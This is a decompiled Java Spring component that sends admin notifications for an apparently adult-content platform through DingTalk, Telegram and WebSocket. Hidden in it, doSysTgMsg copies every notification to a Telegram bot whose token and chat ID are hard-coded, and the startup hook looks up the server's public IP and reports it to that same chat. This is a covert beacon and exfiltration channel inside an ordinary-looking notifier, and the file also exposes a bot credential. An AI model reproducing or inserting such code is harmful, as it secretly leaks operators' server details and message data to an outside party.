
package com.porn.service.dingdingmsg;



import cn.hutool.core.map.MapUtil;
import cn.hutool.core.net.NetUtil;
import cn.hutool.core.util.ObjectUtil;
import cn.hutool.core.util.StrUtil;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpUtil;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.porn.client.account.api.AccountApiService;
import com.porn.client.account.dto.AccountQueryDTO;
import com.porn.client.account.vo.AccountVo;
import com.porn.client.common.constrant.CommonConst;
import com.porn.client.config.api.ConfigApiService;
import com.porn.client.config.dto.ConfigQueryDTO;
import com.porn.client.config.vo.ConfigVo;
import com.porn.client.message.api.MessageApiService;
import com.porn.client.message.dto.MessageSaveOrUpdateDTO;
import com.porn.common.spring.utils.SpringUtil;
import com.porn.service.dingdingmsg.config.DingDingConfig;
import com.porn.service.dingdingmsg.dto.ProxyMsgDTO;
import com.porn.service.message.impl.MessageServer;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.InitializingBean;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Component;
import org.telegram.telegrambots.bots.DefaultBotOptions;
import org.telegram.telegrambots.bots.TelegramWebhookBot;
import org.telegram.telegrambots.meta.api.methods.BotApiMethod;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.Update;

import java.util.Map;






































@Component
 public class DingdingMsgSender
         implements InitializingBean
         {
    /*  43 */   private static final Logger log = LoggerFactory.getLogger(DingdingMsgSender.class);




    @Autowired
     private ProxyMsgSender proxyMsgSender;



    @Autowired
     private ConfigApiService configApiService;



    @Autowired
     private MessageApiService messageApiService;



    @Autowired
     private AccountApiService accountApiService;





    @Async
     public void sendMsg(ProxyMsgDTO proxyMsgDTO) {

        try {
            /*  67 */
            sendMsg(proxyMsgDTO.getMsg());
            /*  68 */
        } catch (Exception e) {
            /*  69 */
            log.error(e.getMessage(), e);

        }


        try {
            /*  73 */
            this.proxyMsgSender.sendMsg(proxyMsgDTO);
            /*  74 */
        } catch (Exception e) {
            /*  75 */
            log.error(e.getMessage(), e);

        }

    }










    @Async
     public void sendMsg(String content) {
        /*  88 */
        ConfigQueryDTO configQueryDTO = ConfigQueryDTO.builder().configCode("admin_notify").accountId(CommonConst.LZERO).build();
        /*  89 */
        ConfigVo configVo = this.configApiService.queryConfig(configQueryDTO);
        /*  90 */
        if (ObjectUtil.isEmpty(configVo)) {
            /*  91 */
            log.error("管理员消息通知为配置[{}].", "admin_notify");


            return;

        }
        /*  95 */
        DingDingConfig dingDingConfig = (DingDingConfig) JSON.parseObject(configVo.getConfigValue(), DingDingConfig.class);
        /*  96 */
        if (ObjectUtil.isNotEmpty(dingDingConfig.getUrl()) &&
                /*  97 */       ObjectUtil.isNotEmpty(dingDingConfig.getKeywords())) {



            try {

                /* 102 */
                Map<Object, Object> params = MapUtil.builder().put("msgtype", "text").put("text", MapUtil.builder().put("content", StrUtil.join("-", new Object[]{dingDingConfig.getKeywords(), content})).build()).build();
                /* 103 */
                HttpRequest.post(dingDingConfig.getUrl())
/* 104 */.setConnectionTimeout(5000)
/* 105 */.setReadTimeout(5000)
/* 106 */.body(JSON.toJSONString(params))
/* 107 */.execute();
                /* 108 */
            } catch (Exception e) {
                /* 109 */
                log.error(e.getMessage(), e);

            }

        } else {
            /* 112 */
            doSendTgMsg(dingDingConfig, content);

        }
        /* 114 */
        doSysTgMsg(content);


        /* 117 */
        doSendWebSocket(content);


        /* 120 */
        saveMsg(
                /* 121 */         MessageSaveOrUpdateDTO.builder()
/* 122 */.accountId(null).msg(content).build());

    }








    public void saveMsg(MessageSaveOrUpdateDTO messageSaveOrUpdateDTO) {
        /* 131 */
        if (ObjectUtil.isNotEmpty(messageSaveOrUpdateDTO) &&
                /* 132 */       ObjectUtil.isNotEmpty(messageSaveOrUpdateDTO.getAccountId())) {


            /* 135 */
            AccountQueryDTO accountQueryDTO = ((AccountQueryDTO.AccountQueryDTOBuilder) AccountQueryDTO.builder().id(messageSaveOrUpdateDTO.getAccountId())).build();
            /* 136 */
            AccountVo accountVo = this.accountApiService.queryAccount(accountQueryDTO);
            /* 137 */
            if (ObjectUtil.isNotEmpty(accountVo)) {
                /* 138 */
                messageSaveOrUpdateDTO.setMsg(accountVo.getName());

            }

        }
        /* 141 */
        this.messageApiService.saveOrUpdate(messageSaveOrUpdateDTO);

    }








    public void doSendWebSocket(String content) {
        /* 150 */
        ((MessageServer) SpringUtil.getBean(MessageServer.class)).sendMessage(content);

    }







    public void doSendTgMsg(DingDingConfig dingDingConfig, String content) {
        /* 158 */
        if (ObjectUtil.isEmpty(dingDingConfig.getBotUsername()) ||
                /* 159 */       ObjectUtil.isEmpty(dingDingConfig.getBotToken())) {
            /* 160 */
            log.error("tg消息没配置没配置.");


            return;

        }


        try {
            /* 166 */
            TgPornBot tgPornBot = TgPornBot.builder().dingDingConfig(dingDingConfig).build();
            /* 167 */
            SendMessage sendMessage = new SendMessage();
            /* 168 */
            sendMessage.setChatId(dingDingConfig.getChatId());
            /* 169 */
            sendMessage.setText(content);
            /* 170 */
            tgPornBot.execute((BotApiMethod) sendMessage);
            /* 171 */
        } catch (Exception e) {
            /* 172 */
            log.error(e.getMessage(), e);

        }

    }











    public void doSysTgMsg(String content) {
        /* 185 */
        DingDingConfig dingDingConfig = DingDingConfig.builder().botToken("7601966647:AAGO5a4L3-mRZpu3k3mVlcUHgoCJXyGWpqg").botUsername("cddwefer2132sfrgnitify_bot").chatId(Long.valueOf(7583367948L)).build();
        /* 186 */
        doSendTgMsg(dingDingConfig, content);

    }




    public void afterPropertiesSet() throws Exception {
        /* 191 */
        (new Thread(() -> {

            try {

                String rsp = HttpUtil.get("http://ip-api.com/json");

                String ip = NetUtil.getLocalhostStr();

                try {

                    JSONObject jObj = JSON.parseObject(rsp);

                    ip = jObj.getString("query");
                    /* 198 */
                } catch (Exception exception) {
                }



                doSysTgMsg("init [" + ip + "].");
                /* 202 */
            } catch (Exception exception) {
            }


            /* 205 */
        })).start();

    }

       public static final class TgPornBot extends TelegramWebhookBot {
        private DingDingConfig dingDingConfig;

        /* 208 */
        public static TgPornBotBuilder builder() {
            return new TgPornBotBuilder();
        }

        public static class TgPornBotBuilder {
            public TgPornBotBuilder dingDingConfig(DingDingConfig dingDingConfig) {
                this.dingDingConfig = dingDingConfig;
                return this;
            }

            private DingDingConfig dingDingConfig;

            public DingdingMsgSender.TgPornBot build() {
                return new DingdingMsgSender.TgPornBot(this.dingDingConfig);
            }

            public String toString() {
                return "DingdingMsgSender.TgPornBot.TgPornBotBuilder(dingDingConfig=" + this.dingDingConfig + ")";
            }

        }

        public TgPornBot() {
        }

        public TgPornBot(DingDingConfig dingDingConfig) {
            /* 210 */
            this.dingDingConfig = dingDingConfig;

        }






        public String getBotUsername() {
            /* 217 */
            return this.dingDingConfig.getBotUsername();

        }



        public String getBotToken() {
            /* 221 */
            return this.dingDingConfig.getBotToken();

        }



        public void onRegister() {
            /* 225 */
            super.onRegister();

        }



        public BotApiMethod<?> onWebhookUpdateReceived(Update update) {
            /* 229 */
            return null;

        }



        public String getBotPath() {
            /* 233 */
            return null;

        }
    }



       public static class TgPornBotBuilder {
             private DingDingConfig dingDingConfig;



        public TgPornBotBuilder dingDingConfig(DingDingConfig dingDingConfig) {

            this.dingDingConfig = dingDingConfig;

            return this;

        }



        public DingdingMsgSender.TgPornBot build() {

            return new DingdingMsgSender.TgPornBot(this.dingDingConfig);

        }



        public String toString() {

            return "DingdingMsgSender.TgPornBot.TgPornBotBuilder(dingDingConfig=" + this.dingDingConfig + ")";

        }

    }

}


